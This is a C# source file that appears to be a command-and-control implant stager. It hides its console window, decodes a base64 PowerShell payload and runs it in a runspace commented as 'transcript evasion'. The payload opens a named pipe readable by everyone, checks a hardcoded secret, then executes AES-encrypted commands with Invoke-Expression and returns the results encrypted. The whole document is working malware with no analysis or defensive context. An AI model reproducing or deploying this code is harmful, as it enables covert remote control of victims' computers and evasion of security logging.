using System;
using System.Text;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

public class Program
{
    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentThread();
    [DllImport("kernel32.dll")] static extern bool TerminateThread(IntPtr hThread, uint dwExitCode);

    public static IntPtr DllBaseAddress = IntPtr.Zero;
    public const int SW_HIDE = 0;
    public const int SW_SHOW = 5;
    public static string basepayload = "ZnVuY3Rpb24gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QKewogICAgcGFyYW0KICAgICgKICAgICAgICBbT2JqZWN0XQogICAgICAgICRrZXksCiAgICAgICAgW09iamVjdF0KICAgICAgICAkSVYKICAgICkKICAgICRhZXNNYW5hZ2VkID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgJ1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmlqbmRhZWxNYW5hZ2VkJwogICAgJGFlc01hbmFnZWQuTW9kZSA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkNpcGhlck1vZGVdOjpDQkMKICAgICRhZXNNYW5hZ2VkLlBhZGRpbmcgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5QYWRkaW5nTW9kZV06Olplcm9zCiAgICAkYWVzTWFuYWdlZC5CbG9ja1NpemUgPSAxMjgKICAgICRhZXNNYW5hZ2VkLktleVNpemUgPSAyNTYKICAgIGlmICgkSVYpCiAgICB7CiAgICAgICAgaWYgKCRJVi5nZXRUeXBlKCkuTmFtZSAtZXEgJ1N0cmluZycpCiAgICAgICAgeyRhZXNNYW5hZ2VkLklWID0gW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygkSVYpfQogICAgICAgIGVsc2UKICAgICAgICB7JGFlc01hbmFnZWQuSVYgPSAkSVZ9CiAgICB9CiAgICBpZiAoJGtleSkKICAgIHsKICAgICAgICBpZiAoJGtleS5nZXRUeXBlKCkuTmFtZSAtZXEgJ1N0cmluZycpCiAgICAgICAgeyRhZXNNYW5hZ2VkLktleSA9IFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJGtleSl9CiAgICAgICAgZWxzZQogICAgICAgIHskYWVzTWFuYWdlZC5LZXkgPSAka2V5fQogICAgfQogICAgJGFlc01hbmFnZWQKfQoKZnVuY3Rpb24gRW5jcnlwdC1TdHJpbmcKewogICAgcGFyYW0KICAgICgKICAgICAgICBbT2JqZWN0XQogICAgICAgICRrZXksCiAgICAgICAgW09iamVjdF0KICAgICAgICAkdW5lbmNyeXB0ZWRTdHJpbmcKICAgICkKCiAgICAkYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR1bmVuY3J5cHRlZFN0cmluZykKICAgICRhZXNNYW5hZ2VkID0gQ3JlYXRlLUFlc01hbmFnZWRPYmplY3QgJGtleQogICAgJGVuY3J5cHRvciA9ICRhZXNNYW5hZ2VkLkNyZWF0ZUVuY3J5cHRvcigpCiAgICAkZW5jcnlwdGVkRGF0YSA9ICRlbmNyeXB0b3IuVHJhbnNmb3JtRmluYWxCbG9jaygkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpCiAgICBbYnl0ZVtdXSAkZnVsbERhdGEgPSAkYWVzTWFuYWdlZC5JViArICRlbmNyeXB0ZWREYXRhCiAgICBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkZnVsbERhdGEpCn0KZnVuY3Rpb24gRGVjcnlwdC1TdHJpbmcKewogICAgcGFyYW0KICAgICgKICAgICAgICBbT2JqZWN0XQogICAgICAgICRrZXksCiAgICAgICAgW09iamVjdF0KICAgICAgICAkZW5jcnlwdGVkU3RyaW5nV2l0aElWCiAgICApCiAgICAkYnl0ZXMgPSBbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCRlbmNyeXB0ZWRTdHJpbmdXaXRoSVYpCiAgICAkSVYgPSAkYnl0ZXNbMC4uMTVdCiAgICAkYWVzTWFuYWdlZCA9IENyZWF0ZS1BZXNNYW5hZ2VkT2JqZWN0ICRrZXkgJElWCiAgICAkZGVjcnlwdG9yID0gJGFlc01hbmFnZWQuQ3JlYXRlRGVjcnlwdG9yKCkKICAgICR1bmVuY3J5cHRlZERhdGEgPSAkZGVjcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soJGJ5dGVzLCAxNiwgJGJ5dGVzLkxlbmd0aCAtIDE2KQogICAgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoJHVuZW5jcnlwdGVkRGF0YSkuVHJpbShbY2hhcl0wKQp9CgpmdW5jdGlvbiBpbnZva2UtcHNlcnYgewpwYXJhbSAoJHNlY3JldCwgJGtleSwgJHBuYW1lKQoKYWRkLVR5cGUgLWFzc2VtYmx5ICdTeXN0ZW0uQ29yZScKJFBpcGVTZWN1cml0eSA9IE5ldy1PYmplY3QgU3lzdGVtLklPLlBpcGVzLlBpcGVTZWN1cml0eQokQWNjZXNzUnVsZSA9IE5ldy1PYmplY3QgU3lzdGVtLklPLlBpcGVzLlBpcGVBY2Nlc3NSdWxlKCAnRXZlcnlvbmUnLCAnUmVhZFdyaXRlJywgJ0FsbG93JyApCiRQaXBlU2VjdXJpdHkuQWRkQWNjZXNzUnVsZSgkQWNjZXNzUnVsZSkKJFBpcGUgPSBOZXctT2JqZWN0IFN5c3RlbS5JTy5QaXBlcy5OYW1lZFBpcGVTZXJ2ZXJTdHJlYW0oJHBuYW1lLCdJbk91dCcsMTAwLCAnQnl0ZScsICdOb25lJywgNDA5NiwgNDA5NiwgJFBpcGVTZWN1cml0eSkKCnRyeSB7CiAgICAnV2FpdGluZyBmb3IgY2xpZW50IGNvbm5lY3Rpb24nCiAgICAkcGlwZS5XYWl0Rm9yQ29ubmVjdGlvbigpCiAgICAnQ29ubmVjdGlvbiBlc3RhYmxpc2hlZCcKCiAgICAkcGlwZVJlYWRlciA9IG5ldy1vYmplY3QgU3lzdGVtLklPLlN0cmVhbVJlYWRlcigkcGlwZSkKICAgICRwaXBlV3JpdGVyID0gbmV3LW9iamVjdCBTeXN0ZW0uSU8uU3RyZWFtV3JpdGVyKCRwaXBlKQogICAgJHBpcGVXcml0ZXIuQXV0b0ZsdXNoID0gJHRydWUKCiAgICAkUFBhc3MgPSAkcGlwZVJlYWRlci5SZWFkTGluZSgpCgoKICAgIHdoaWxlICgxKQogICAgewogICAgICAgIGlmICgkUFBhc3MgLW5lICRzZWNyZXQpIHsKICAgICAgICAgICAgJHBpcGVXcml0ZXIuV3JpdGVMaW5lKCdNaWNyb3NvZnQgRXJyb3I6IDE1MTMzNycpCiAgICAgICAgfQoKICAgICAgICBlbHNlIHsKCiAgICAgICAgICAgIHdoaWxlICgxKSB7CiAgICAgICAgICAgICAgICAkZW5jQ29tbWFuZCA9IEVuY3J5cHQtU3RyaW5nIC11bmVuY3J5cHRlZFN0cmluZyAnQ09NTUFORCcgLUtleSAka2V5CiAgICAgICAgICAgICAgICAkcGlwZVdyaXRlci5Xcml0ZUxpbmUoJGVuY0NvbW1hbmQpCgogICAgICAgICAgICAgICAgJGNvbW1hbmQgPSAkcGlwZVJlYWRlci5SZWFkTGluZSgpCiAgICAgICAgICAgICAgICAkZGVjQ29tbWFuZCA9IERlY3J5cHQtU3RyaW5nIC1rZXkgJGtleSAtZW5jcnlwdGVkU3RyaW5nV2l0aElWICRjb21tYW5kCgogICAgICAgICAgICAgICAgaWYgKCRkZWNjb21tYW5kKSB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgJGVycm9yLmNsZWFyKCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRkZWNDb21tYW5kIC1lcSAnS0lMTFBJUEUnKXtleGl0fQogICAgICAgICAgICAgICAgICAgICAgICAkcmVzID0gSW52b2tlLUV4cHJlc3Npb24gJGRlY0NvbW1hbmQgfCBvdXQtc3RyaW5nCiAgICAgICAgICAgICAgICAgICAgICAgICRTdGRFcnJvciA9ICgkZXJyb3JbMF0gfCBPdXQtU3RyaW5nKQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFN0ZEVycm9yKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAkcmVzID0gJHJlcyArICRTdGRFcnJvcgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkcmVzIC1lcSAiIil7JHJlcyA9ICJObyBvdXRwdXQgZnJvbSBjb21tYW5kIn0KICAgICAgICAgICAgICAgICAgICAgICAgJHJlcyA9ICRyZXMgKyAnMTIzNDU2UFMgJyArIChHZXQtTG9jYXRpb24pLlBhdGggKyAnPjY1NDMyMScKICAgICAgICAgICAgICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHJlcyA9ICdFcnJvclVwbG9hZDogJyArICRlcnJvclswXQogICAgICAgICAgICAgICAgICAgICAgICAkcmVzID0gJHJlcyArICcxMjM0NTZQUyAnICsgKEdldC1Mb2NhdGlvbikuUGF0aCArICc+NjU0MzIxJwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkZmlsZUNvbnRlbnRCeXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0Qnl0ZXMoJHJlcykKICAgICAgICAgICAgICAgICAgICAkcmVzID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJGZpbGVDb250ZW50Qnl0ZXMpCiAgICAgICAgICAgICAgICAgICAgJGVuY0NvbW1hbmQyID0gRW5jcnlwdC1TdHJpbmcgLXVuZW5jcnlwdGVkU3RyaW5nICRyZXMgLUtleSAka2V5CiAgICAgICAgICAgICAgICAgICAgJHBpcGVXcml0ZXIuV3JpdGVMaW5lKCRlbmNDb21tYW5kMikKICAgICAgICAgICAgICAgICAgICAkcGlwZVdyaXRlci5GbHVzaCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlaWYgKCEkZGVjQ29tbWFuZCkgewogICAgICAgICAgICAgICAgICAgICRlbmNiYWQgPSBFbmNyeXB0LVN0cmluZyAtdW5lbmNyeXB0ZWRTdHJpbmcgJ1RoaXMgc2hvdWxkIG5ldmVyIGZpcmUhIC0gY3J5cHRvIGZhaWx1cmUnIC1LZXkgJGtleQogICAgICAgICAgICAgICAgICAgICRwaXBlV3JpdGVyLldyaXRlTGluZSgkZW5jYmFkKQogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgICRlbmNHbyA9IEVuY3J5cHQtU3RyaW5nIC11bmVuY3J5cHRlZFN0cmluZyAnR09BR0FJTicgLUtleSAka2V5CiAgICAgICAgJHBpcGVXcml0ZXIuV3JpdGVMaW5lKCRlbmNHbykKICAgICAgICAkZW5jU3VyZSA9IEVuY3J5cHQtU3RyaW5nIC11bmVuY3J5cHRlZFN0cmluZyAnU1VSRScgLUtleSAka2V5CiAgICAgICAgJHBpcGVXcml0ZXIuV3JpdGVMaW5lKCRlbmNTdXJlKQogICAgICAgICRjb21tYW5kID0gJHBpcGVSZWFkZXIuUmVhZExpbmUoKQogICAgICAgICRkZWNDb21tYW5kID0gRGVjcnlwdC1TdHJpbmcgLWtleSAka2V5IC1lbmNyeXB0ZWRTdHJpbmdXaXRoSVYgJGNvbW1hbmQKICAgICAgICBpZiAoJGRlY0NvbW1hbmQgLWVxICdFWElUJykgeyBicmVhayB9CiAgICB9CgogICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgMgp9CmZpbmFsbHkgewogICAgJHBpcGUuRGlzcG9zZSgpCn0KfQppbnZva2UtcHNlcnYgLXNlY3JldCBtdGtuNCAta2V5IFRFa0QxZ3NKUXlySXk1c3RNSThHNHFaUXpsU3JDckZ2djM2YUhDRnV3cVE9IC1wbmFtZSBqYWNjZHBxbnZicnJ4bGFmCg==";

    public Program() {
        try
        {
            string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String(basepayload));
            InvokeAutomation(tt);
        }
        catch
        {
            Main();
        }
    }
    public static string InvokeAutomation(string cmd)
    {
        Runspace newrunspace = RunspaceFactory.CreateRunspace();
        newrunspace.Open();

        // transcript evasion
        RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
        var cmdin = new System.Management.Automation.PSVariable("c");
        newrunspace.SessionStateProxy.PSVariable.Set(cmdin);
        var output = new System.Management.Automation.PSVariable("o");
        newrunspace.SessionStateProxy.PSVariable.Set(output);

        Pipeline pipeline = newrunspace.CreatePipeline();
        newrunspace.SessionStateProxy.SetVariable("c", cmd);
        pipeline.Commands.AddScript("$o = IEX $c | Out-String");
        Collection<PSObject> results = pipeline.Invoke();
        newrunspace.Close();

        StringBuilder stringBuilder = new StringBuilder();
        foreach (PSObject obj in results)
        {
            stringBuilder.Append(obj);
        }
        return stringBuilder.ToString().Trim();
    }
    public static void Sharp(long baseAddr=0)
    {
        DllBaseAddress = new IntPtr(baseAddr);
        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);
        try
        {
            string cmd = Encoding.UTF8.GetString(System.Convert.FromBase64String(basepayload));
            InvokeAutomation(cmd);
        }
        catch { }
        var x = GetCurrentThread();
        TerminateThread(x, 0);

    }
    public static void Main()
    {
        Sharp();
    }
}